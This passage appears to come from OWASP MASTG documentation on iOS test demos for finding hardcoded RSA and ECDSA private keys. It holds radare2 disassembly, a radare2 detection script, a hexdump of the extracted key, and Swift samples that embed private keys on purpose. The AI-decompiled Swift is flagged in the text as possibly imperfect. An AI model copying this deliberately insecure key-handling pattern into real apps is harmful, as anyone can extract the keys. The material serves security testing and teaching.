\u2502\u2502   0x1000050f4      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050f8      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x1000050fc      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005100      ldp x8, x21, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005104      stp x27, x24, [x29, -0x88]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005108      stur x25, [x29, -0x78]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000510c      stp x8, x21, [x19, 0x80]\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005110      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005114      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005118      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000511c      add x0, x0, 0x358                         ; int64_t arg1\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005120      bl sym.func.1000052a8\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005124      mov x1, x0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005128      add x0, x19, 0x80\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000512c      sub x20, x29, 0x88\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005130      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005134      ldr x0, [x19, 0x38]                       ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005138      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000513c      mov x0, x23                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005140      mov x1, x22                               ; int64_t arg2\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005144      bl sym.func.100005384\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x100005148      bl sym.imp.objc_release_x28\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   0x10000514c      bl sym.imp.objc_release_x26\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100005024(x)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2514\u2500&gt; 0x100005150      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502\u2502\u2502 \u2502    0x100005154      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u250c\u2500&lt; 0x100005158      b 0x100005244\n\u2502 \u2502\u2502\u2502\u2502 \u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100004d10(x)\n\u2502 \u2502\u2502\u2514\u2500\u2500\u2500\u2500\u2500&gt; 0x10000515c      mov x8, -0x2000000000000000\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005160      stp xzr, x8, [x29, -0x88]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005164      sub x20, x29, 0x88\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005168      mov w0, 0x12\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000516c      bl sym _StringGuts.grow...SiF             ; sym.imp._StringGuts.grow...SiF\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005170      ldur x0, [x29, -0x80]                     ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005174      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005178      adrp x8, 0x100008000\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000517c      add x8, x8, 0x560                         ; 0x100008560 ; \"Signing failed: \"\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005180      sub x8, x8, 0x20\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005184      orr x8, x8, 0x8000000000000000\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005188      stp x25, x8, [x29, -0x88]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000518c      ldr x8, [x19, 0x90]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005190      str x8, [x19, 0x80]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005194      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005198      add x0, x0, 0x350                         ; int64_t arg1\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000519c      bl sym.func.1000052a8\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051a0      mov x1, x0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051a4      add x0, x19, 0x80\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051a8      bl sym describing__String...clufC         ; sym.imp.describing__String...clufC\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051ac      mov x21, x1\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051b0      sub x20, x29, 0x88\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051b4      bl sym append...ySSF                      ; sym.imp.append...ySSF\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051b8      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051bc      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051c0      ldp x8, x21, [x29, -0x88]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051c4      ldr x10, [x19, 0x60]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051c8      ldr x9, [x19, 0x68]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051cc      stp x10, x9, [x29, -0x88]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051d0      ldr x9, [x19, 0x70]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051d4      stur x9, [x29, -0x78]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051d8      stp x8, x21, [x19, 0x80]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051dc      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051e0      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051e4      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051e8      add x0, x0, 0x358                         ; int64_t arg1\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051ec      bl sym.func.1000052a8\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051f0      mov x1, x0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051f4      add x0, x19, 0x80\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051f8      sub x20, x29, 0x88\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x1000051fc      bl sym SwiftUI.State.wrappedValue...s     ; sym.imp.SwiftUI.State.wrappedValue...s\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005200      ldr x0, [x19, 0x38]                       ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005204      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005208      ldp x0, x1, [x19, 0x20]                   ; int64_t arg2\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000520c      bl sym.func.100005384\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005210      mov x0, x21                               ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005214      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005218      ldr x0, [x19, 0x40]                       ; int64_t arg2\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000521c      ldr x1, [x19, 0x50]\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005220      bl sym.func.10000544c\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005224      ldr x0, [x19, 0x18]                       ; void *arg0\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005228      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x10000522c      mov x0, x26\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   0x100005230      mov x1, x24\n\u2502 \u2502\u2502 \u2502 \u2502\u2502   ; CODE XREF from sym.func.10000491c @ 0x100004f64(x)\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; 0x100005234      bl sym.func.100005384\n\u2502  \u2502 \u2502 \u2502\u2502   0x100005238      bl sym.imp.objc_release_x28\n\u2502  \u2502 \u2502 \u2502\u2502   0x10000523c      ldr x8, [x19, 0x30]\n\u2502  \u2502 \u2502 \u2502\u2502   0x100005240      bl sym.imp.objc_release_x8\n\u2502  \u2502 \u2502 \u2502\u2502   ; CODE XREFS from sym.func.10000491c @ 0x100005094(x), 0x100005158(x)\n\u2502  \u2502 \u2502 \u2514\u2514\u2500&gt; 0x100005244      ldur x8, [x29, -0x60]\n\u2502  \u2502 \u2502      0x100005248      adrp x9, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502  \u2502 \u2502      0x10000524c      ldr x9, reloc.__stack_chk_guard           ; 0x10000c408\n\u2502  \u2502 \u2502      0x100005250      ldr x9, [x9]\n\u2502  \u2502 \u2502      0x100005254      cmp x9, x8\n\u2502  \u2502 \u2502  \u250c\u2500&lt; 0x100005258      b.ne 0x10000527c\n\u2502  \u2502 \u2502  \u2502   0x10000525c      sub sp, x29, 0x50\n\u2502  \u2502 \u2502  \u2502   0x100005260      ldp x29, x30, [var_50h_2]\n\u2502  \u2502 \u2502  \u2502   0x100005264      ldp x20, x19, [var_40h]\n\u2502  \u2502 \u2502  \u2502   0x100005268      ldp x22, x21, [var_30h]\n\u2502  \u2502 \u2502  \u2502   0x10000526c      ldp x24, x23, [var_20h]\n\u2502  \u2502 \u2502  \u2502   0x100005270      ldp x26, x25, [var_10h]\n\u2502  \u2502 \u2502  \u2502   0x100005274      ldp x28, x27, [sp], 0x60\n\u2502  \u2502 \u2502  \u2502   0x100005278      ret\n\u2502  \u2502 \u2502  \u2502   ; CODE XREF from sym.func.10000491c @ 0x100005258(x)\n\u2502  \u2502 \u2502  \u2514\u2500&gt; 0x10000527c      bl sym.imp.__stack_chk_fail               ; void __stack_chk_fail(void)\n\u2502  \u2502 \u2502      ; CODE XREF from sym.func.10000491c @ 0x100004cd0(x)\n\u2502  \u2502 \u2514\u2500\u2500\u2500\u2500&gt; 0x100005280      ldr x0, [x19, 0x68]                       ; void *arg0\n\u2502  \u2502        0x100005284      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502  \u2502        0x100005288      ldr x0, [x19, 0x70]                       ; void *arg0\n\u2502  \u2502        0x10000528c      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502  \u2502        0x100005290      brk 1\n\u2502  \u2502        ; CODE XREF from sym.func.10000491c @ 0x100004dfc(x)\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500&gt; 0x100005294      ldr x0, [x19, 0x68]                       ; void *arg0\n\u2502           0x100005298      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502           0x10000529c      ldr x0, [x19, 0x70]                       ; void *arg0\n\u2502           0x1000052a0      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2514           0x1000052a4      brk 1\n</code></pre> <pre><code>// \u2728 Decompiled using OpenAI's ChatGPT o1-review model \u2728\n\nimport Security\n\nfunc runCryptoFunction() {\n    // Step 1: Load RSA Private Key from Embedded Data\n    // The key data is hardcoded and embedded in the binary\n    let keyBytes: [UInt8] = [\n        // The bytes from the data provided\n        0x30, 0x82, 0x02, 0x5b, 0x02, 0x01, 0x00, 0x02,\n        0x81, 0x81, 0x00, 0xbd, 0xf6, 0x89, 0x8f, 0xbd,\n        0x0c, 0xe6, 0x4f, 0x9a, 0x97, 0xec, 0x30, 0x1a,\n        // ...\n        // For brevity, the full key data is not shown\n    ]\n    let keyData = Data(keyBytes)\n\n    // Key attributes for creating the key\n    let keyDict: [String: Any] = [\n        kSecAttrKeyType as String:            kSecAttrKeyTypeRSA,\n        kSecAttrKeyClass as String:           kSecAttrKeyClassPrivate,\n        kSecAttrKeySizeInBits as String:      1024,\n        kSecReturnPersistentRef as String:    true,\n    ]\n\n    var error: Unmanaged&lt;CFError&gt;?\n\n    // Create the private key from the data\n    guard let privateKey = SecKeyCreateWithData(keyData as CFData, keyDict as CFDictionary, &amp;error) else {\n        let errorMessage = \"Failed to create private key: \\(error!.takeRetainedValue() as Error)\"\n        self.output = errorMessage\n        return\n    }\n\n    // Step 2: Extract Public Key\n    guard let publicKey = SecKeyCopyPublicKey(privateKey) else {\n        let errorMessage = \"Failed to generate public key\"\n        self.output = errorMessage\n        return\n    }\n\n    // Step 3: Create Sample Data\n    let sampleText = \"This is a sample text\"\n    guard let data = sampleText.data(using: .utf8) else {\n        self.output = \"Failed to convert text to data\"\n        return\n    }\n\n    // Step 4: Sign the Data\n    let algorithm: SecKeyAlgorithm = .rsaSignatureMessagePKCS1v15SHA256\n    guard SecKeyIsAlgorithmSupported(privateKey, .sign, algorithm) else {\n        self.output = \"Algorithm not supported for signing\"\n        return\n    }\n    guard let signatureData = SecKeyCreateSignature(privateKey, algorithm, data as CFData, &amp;error) as Data? else {\n        let errorMessage = \"Signing failed: \\(error!.takeRetainedValue() as Error)\"\n        self.output = errorMessage\n        return\n    }\n\n    // Step 5: Verify the Signature\n    guard SecKeyIsAlgorithmSupported(publicKey, .verify, algorithm) else {\n        self.output = \"Algorithm not supported for verification\"\n        return\n    }\n    let isVerified = SecKeyVerifySignature(publicKey, algorithm, data as CFData, signatureData as CFData, &amp;error)\n\n    // Step 6: Convert Keys and Signature to Hex Strings\n    guard let publicKeyData = SecKeyCopyExternalRepresentation(publicKey, &amp;error) as Data? else {\n        let errorMessage = \"Failed to extract public key: \\(error!.takeRetainedValue() as Error)\"\n        self.output = errorMessage\n        return\n    }\n    let publicKeyHex = publicKeyData.map { String(format: \"%02x\", $0) }.joined()\n    let signatureHex = signatureData.map { String(format: \"%02x\", $0) }.joined()\n\n    // Step 7: Construct an Output Message\n    var outputMessage = \"Original: \\(sampleText)\"\n    outputMessage += \"\\n\\nSignature is \\(isVerified ? \"valid.\" : \"invalid.\")\"\n    outputMessage += \"\\n\\nPublic Key (Hex): \\(publicKeyHex)\"\n    outputMessage += \"\\n\\nSignature (Hex): \\(signatureHex)\"\n    outputMessage += \"\\n\\nVerification: \\(isVerified ? \"Success\" : \"Failure\")\"\n\n    // Step 8: Update SwiftUI State Variable\n    self.output = outputMessage\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0013/MASTG-DEMO-0013/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> sec_hardcoded_rsa.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Uses of SecKeyCreateWithData:\nafl~SecKeyCreateWithData\n\n?e\n\n?e xrefs to SecKeyCreateWithData:\naxt @ 0x100007904\n\n?e\n\npdf @ sym.func.10000491c &gt; function.asm\n\npx 607 @ 0x1000100c8 &gt; key.asm\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i sec_hardcoded_rsa.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0013/MASTG-DEMO-0013/#observation","title":"Observation","text":"<p>The output reveals a call to <code>SecKeyCreateWithData</code> as well as the hardcoded RSA private key within the DATA section of the binary.</p> output.asmkey.asm <pre><code>Uses of SecKeyCreateWithData:\n0x100007904    1     12 sym.imp.SecKeyCreateWithData\n\nxrefs to SecKeyCreateWithData:\nsym.func.10000491c 0x100004b7c [CALL:--x] bl sym.imp.SecKeyCreateWithData\n</code></pre> <pre><code>- offset -   C8C9 CACB CCCD CECF D0D1 D2D3 D4D5 D6D7  89ABCDEF01234567\n0x1000100c8  3082 025b 0201 0002 8181 00bd f689 8fbd  0..[............\n0x1000100d8  0ce6 4f9a 97ec 301a 4893 4d2a bfdf f708  ..O...0.H.M*....\n0x1000100e8  154c db87 e5df b1cf 8da2 5e2a 7d92 a8bd  .L........^*}...\n0x1000100f8  30b9 10cf 96da 1025 d467 af92 26fa 43b7  0......%.g..&amp;.C.\n0x100010108  8683 a268 d47a 56ce 4141 edc0 100c 89a5  ...h.zV.AA......\n0x100010118  4e5f c459 cc55 091f a11f 1fb7 971d 531b  N_.Y.U........S.\n0x100010128  7338 4c3e e828 1dc1 686a 8d3e b0f2 0ab3  s8L&gt;.(..hj.&gt;....\n0x100010138  7426 d2dc cfa4 acf3 5b26 35d1 2dee 9141  t&amp;......[&amp;5.-..A\n0x100010148  a693 ed91 fad7 4383 8553 e502 0301 0001  ......C..S......\n0x100010158  0281 8001 edbf 79cd ee94 3273 1c5f 5e88  ......y...2s._^.\n0x100010168  0f62 9448 983b 5480 8f1b 9adc 9a91 16aa  .b.H.;T.........\n0x100010178  149c a86a e66c b0f9 7f92 8b0d c084 2513  ...j.l........%.\n0x100010188  d3a6 75da 163a d30f fc8f 71fc 7e16 fbe5  ..u..:....q.~...\n0x100010198  7167 c68a 4bfb 1213 6845 d617 bdd2 8369  qg..K...hE.....i\n0x1000101a8  17c8 4484 b025 e449 9e51 9505 79e6 864a  ..D..%.I.Q..y..J\n0x1000101b8  f6c4 5e70 5218 f046 6342 321b 0752 83ee  ..^pR..FcB2..R..\n0x1000101c8  d0bc 0b6e 12ed 27bb 0331 bba5 24c7 2e3b  ...n..'..1..$..;\n0x1000101d8  d6e9 2502 4100 cb78 2f7f 512f 49f0 f8db  ..%.A..x/.Q/I...\n0x1000101e8  2fc3 18c8 4162 4169 4cc0 7898 6cce db86  /...AbAiL.x.l...\n0x1000101f8  1e04 9911 6c3d 988c a1cf b748 a28b 5328  ....l=.....H..S(\n0x100010208  31fd 155f 56c0 c4c1 e625 8b69 83e8 59d2  1.._V....%.i..Y.\n0x100010218  2b3e e7c9 bbfb 0241 00ef 01ad 4fdb a4b9  +&gt;.....A....O...\n0x100010228  5981 235e d110 ee0a a351 246f 6045 5cd5  Y.#^.....Q$o`E\\.\n0x100010238  705c a44a 3270 56a2 6f64 af68 c970 d893  p\\.J2pV.od.h.p..\n0x100010248  3886 1a94 c0be b7b0 9d8d b559 f63a 3aed  8..........Y.::.\n0x100010258  d754 7757 109a ad49 9f02 406c f395 5372  .TwW...I..@l..Sr\n0x100010268  9084 e281 0f35 7b1d c915 a1dc 6edb 4771  .....5{.....n.Gq\n0x100010278  0c05 af9a c32d 4dbe fd22 5db5 5310 ce5e  .....-M..\"].S..^\n0x100010288  5189 a05b 4df9 be90 7435 cb11 50d6 c121  Q..[M...t5..P..!\n0x100010298  eec5 5064 d072 91c3 a235 8302 4062 eed6  ..Pd.r...5..@b..\n0x1000102a8  c6cf ac87 ecbc bfdf 67bb 124d e4fc 9990  ........g..M....\n0x1000102b8  60d1 5574 2466 b4ba e1d6 0e86 7e85 b6f6  `.Ut$f......~...\n0x1000102c8  312c 3cf9 f3d3 cefc f42b fded 65ca 5adf  1,&lt;......+..e.Z.\n0x1000102d8  3a45 304f 736a cb5b 86cc 001f 1102 405e  :E0Osj.[......@^\n0x1000102e8  6bae 7c7d fc8a f597 a939 3727 4ed9 e8d0  k.|}.....97'N...\n0x1000102f8  8da9 32e4 6bde 760f eef1 2211 c41e 4a01  ..2.k.v...\"...J.\n0x100010308  73c4 348c 4d16 f12f 5fe4 e541 3a3b f1b1  s.4.M../_..A:;..\n0x100010318  787c 0e55 f9f7 cf64 93ad 77fd 3152 87    x|.U...d..w.1R.\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0013/MASTG-DEMO-0013/#evaluation","title":"Evaluation","text":"<p>The test fails because a hardcoded RSA private key was found in the code.</p> <p>Note: Using artificial intelligence we're able to decompile the disassembled code and review it. The output is a human-readable version of the assembly code. The AI decompiled code may not perfect and might contain errors but, in this case, it clearly shows the use of <code>SecKeyCreateWithData</code> and the associated private key.</p>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0014/MASTG-DEMO-0014/","title":"MASTG-DEMO-0014: Use of Hardcoded ECDSA Private Key in CryptoKit with r2","text":"<p>  Download MASTG-DEMO-0014 IPA   Open MASTG-DEMO-0014 Folder  Build MASTG-DEMO-0014 IPA</p>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0014/MASTG-DEMO-0014/#sample","title":"Sample","text":"MastgTest.swiftfunction.asmdecompiled-o1-review.swift <pre><code>import Foundation\nimport CryptoKit\n\nstruct MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n\n        // Step 1: Use a hardcoded ECDSA P-256 private key (32 bytes for P-256) in bytes\n        let privateKeyBytes: [UInt8] = [\n            0x7c, 0x02, 0x2a, 0x7e, 0x53, 0x7e, 0x1a, 0x2d, \n            0x44, 0x77, 0xd4, 0xf6, 0x20, 0x8b, 0x14, 0xdb, \n            0x4e, 0x8d, 0x84, 0x19, 0xd6, 0x23, 0x5f, 0xf2, \n            0x4e, 0x4b, 0x8d, 0x18, 0xf4, 0x2c, 0x76, 0xe2\n        ]\n        let privateKeyData = Data(privateKeyBytes)\n\n        guard let privateKey = try? P256.Signing.PrivateKey(rawRepresentation: privateKeyData) else {\n            completion(\"Failed to create private key.\")\n            return\n        }\n\n        let publicKey = privateKey.publicKey\n\n        // Data to sign\n        let dataToSign = \"This is a sample text\".data(using: .utf8)!\n\n        // Step 2: Sign the data with the hardcoded private key\n        let signature = try! privateKey.signature(for: dataToSign)\n\n        // Convert signature to hex string for display\n        let signatureHex = signature.rawRepresentation.map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Step 3: Verify the signature with the public key\n        let verificationStatus = publicKey.isValidSignature(signature, for: dataToSign)\n\n        let verificationResult = verificationStatus ? \"Signature is valid.\" : \"Signature is invalid.\"\n\n        let value = \"\"\"\n        Original: \\(String(data: dataToSign, encoding: .utf8)!)\n\n        Public Key (Hex): \\(publicKey.rawRepresentation.map { String(format: \"%02hhx\", $0) }.joined())\n\n        Signature (Hex): \\(signatureHex)\n\n        Verification: \\(verificationResult)\n        \"\"\"\n\n        completion(value)\n    }\n}\n</code></pre> <pre><code>            ; CALL XREF from sym.func.100005f30 @ 0x100005f68(x)\n\u250c 1840: sym.func.1000046dc (int64_t arg1, int64_t arg2, int64_t arg3);\n\u2502           0x1000046dc      stp x28, x27, [sp, -0x60]!\n\u2502           0x1000046e0      stp x26, x25, [var_10h]\n\u2502           0x1000046e4      stp x24, x23, [var_20h]\n\u2502           0x1000046e8      stp x22, x21, [var_30h]\n\u2502           0x1000046ec      stp x20, x19, [var_40h]\n\u2502           0x1000046f0      stp x29, x30, [var_50h_2]\n\u2502           0x1000046f4      add x29, sp, 0x50\n\u2502           0x1000046f8      sub sp, sp, 0xe0\n\u2502           0x1000046fc      stp x1, x2, [x29, -0xa8]                  ; arg3\n\u2502           0x100004700      stur x0, [x29, -0xb0]                     ; arg1\n\u2502           0x100004704      mov x0, 0\n\u2502           0x100004708      bl sym CryptoKit.P256.Signing.ECDSASignature...VMa ; sym.imp.CryptoKit.P256.Signing.ECDSASignature...VMa\n\u2502           0x10000470c      ldur x8, [x0, -8]\n\u2502           0x100004710      stp x8, x0, [x29, -0xe0]\n\u2502           0x100004714      ldr x8, [x8, 0x40]\n\u2502           0x100004718      mov x9, x8\n\u2502           0x10000471c      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004720      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3b8\n\u2502           0x100004724      blr x16\n\u2502           0x100004728      mov x9, sp\n\u2502           0x10000472c      add x8, x8, 0xf\n\u2502           0x100004730      and x8, x8, 0xfffffffffffffff0\n\u2502           0x100004734      sub x8, x9, x8\n\u2502           0x100004738      stur x8, [x29, -0xb8]\n\u2502           0x10000473c      mov sp, x8\n\u2502           0x100004740      mov x0, 0\n\u2502           0x100004744      bl sym Foundation...8EncodingVMa          ; sym.imp.Foundation...8EncodingVMa\n\u2502           0x100004748      ldur x8, [x0, -8]\n\u2502           0x10000474c      stp x8, x0, [x29, -0xd0]\n\u2502           0x100004750      ldr x8, [x8, 0x40]\n\u2502           0x100004754      mov x9, x8\n\u2502           0x100004758      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x10000475c      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3b8\n\u2502           0x100004760      blr x16\n\u2502           0x100004764      mov x9, sp\n\u2502           0x100004768      add x8, x8, 0xf\n\u2502           0x10000476c      and x8, x8, 0xfffffffffffffff0\n\u2502           0x100004770      sub x8, x9, x8\n\u2502           0x100004774      stur x8, [x29, -0xc0]\n\u2502           0x100004778      mov sp, x8\n\u2502           0x10000477c      mov x0, 0\n\u2502           0x100004780      bl sym CryptoKit.P256.Signing.PublicKey...VMa ; sym.imp.CryptoKit.P256.Signing.PublicKey...VMa\n\u2502           0x100004784      mov x27, x0\n\u2502           0x100004788      ldur x26, [x0, -8]\n\u2502           0x10000478c      ldr x8, [x26, 0x40]\n\u2502           0x100004790      mov x9, x8\n\u2502           0x100004794      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004798      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3b8\n\u2502           0x10000479c      blr x16\n\u2502           0x1000047a0      mov x9, sp\n\u2502           0x1000047a4      add x8, x8, 0xf\n\u2502           0x1000047a8      and x8, x8, 0xfffffffffffffff0\n\u2502           0x1000047ac      sub x25, x9, x8\n\u2502           0x1000047b0      mov sp, x25\n\u2502           0x1000047b4      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x1000047b8      add x0, x0, 0xe8                          ; int64_t arg1\n\u2502           0x1000047bc      bl sym.func.100004e0c\n\u2502           0x1000047c0      ldur x8, [x0, -8]\n\u2502           0x1000047c4      ldr x8, [x8, 0x40]\n\u2502           0x1000047c8      mov x9, x8\n\u2502           0x1000047cc      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000047d0      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3b8\n\u2502           0x1000047d4      blr x16\n\u2502           0x1000047d8      mov x9, sp\n\u2502           0x1000047dc      add x8, x8, 0xf\n\u2502           0x1000047e0      and x8, x8, 0xfffffffffffffff0\n\u2502           0x1000047e4      sub x20, x9, x8\n\u2502           0x1000047e8      mov sp, x20\n\u2502           0x1000047ec      mov x0, 0\n\u2502           0x1000047f0      bl sym CryptoKit.P256.Signing.PrivateKey...VMa ; sym.imp.CryptoKit.P256.Signing.PrivateKey...VMa\n\u2502           0x1000047f4      mov x23, x0\n\u2502           0x1000047f8      ldur x28, [x0, -8]\n\u2502           0x1000047fc      ldr x8, [x28, 0x40]\n\u2502           0x100004800      mov x9, x8\n\u2502           0x100004804      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004808      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3b8\n\u2502           0x10000480c      blr x16\n\u2502           0x100004810      mov x9, sp\n\u2502           0x100004814      add x8, x8, 0xf\n\u2502           0x100004818      and x8, x8, 0xfffffffffffffff0\n\u2502           0x10000481c      sub x24, x9, x8\n\u2502           0x100004820      mov sp, x24\n\u2502           0x100004824      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x100004828      add x0, x0, 0xf0                          ; int64_t arg1\n\u2502           0x10000482c      bl sym.func.100004e0c\n\u2502           0x100004830      adrp x1, segment.__DATA                   ; 0x100010000\n\u2502           0x100004834      add x1, x1, 0xa8\n\u2502           0x100004838      bl sym.imp.swift_initStaticObject\n\u2502           